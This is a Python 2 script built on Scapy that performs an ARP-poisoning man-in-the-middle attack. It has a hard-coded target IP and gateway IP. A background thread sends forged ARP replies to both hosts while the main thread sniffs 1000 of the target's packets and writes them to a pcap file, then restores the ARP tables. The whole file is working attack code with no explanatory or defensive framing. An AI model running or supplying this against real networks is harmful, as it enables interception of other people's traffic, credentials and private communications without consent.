from scapy.all import *
import os
import sys
import threading
import signal


interface = "eth0"
target_ip = "172.17.28.23"
gateway_ip = "172.17.28.161"
packet_count = 1000



def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac), count=5)
    #send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac,hwsrc=gateway_mac),count=5)
    #send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac,hwsrc=target_mac), count=5)

    #print "[*] Killing process %d"% os.getpid()
    #os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_addr):

    responses, unanswered = \
        srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr),timeout=2,retry=10)

    for s,r in responses:
        return r[Ether].src

    return None

def poison_target(gateway_ip, gateway_mac, target_ip,target_mac):
    target = ARP()
    target.op=2
    target.psrc=gateway_ip
    target.pdst=target_ip
    target.hwdst=target_mac

    gateway=ARP()
    gateway.op=2
    gateway.psrc=target_ip
    gateway.pdst=gateway_ip
    gateway.hwdst=gateway_mac

    print "[*] Beginning the ARP posion. [Press Control-C to stop]"

    while True:
        try:
            send(target)
            send(gateway)
            time.sleep(2)

        except (KeyboardInterrupt,SystemExit):
            print "[*] ------------ Poisoning thread is going to die"
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
            #sys.exit(0)

    print "[*] ARP poison attack finished."
    return


conf.iface = interface

# switch of the output
conf.verb = 0

print "[*] Setting up %s"%interface
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!] Faild to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s"%(gateway_ip,gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s"% (target_ip,target_mac)

poison_thread = threading.Thread(target = poison_target, args = (gateway_ip,gateway_mac, target_ip, target_mac))
poison_thread.daemon = True
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets"%packet_count

    bpf_filter = "ip host %s" % target_ip

    packets = sniff(count=packet_count,filter=bpf_filter, iface=interface)

    wrpcap('arper.pcap', packets)

    print "[*] The program is terminating..."

    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    #sys.exit(0)

except KeyboardInterrupt:
    print "[*] Interrupt in main thread."
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    #sys.exit(0)




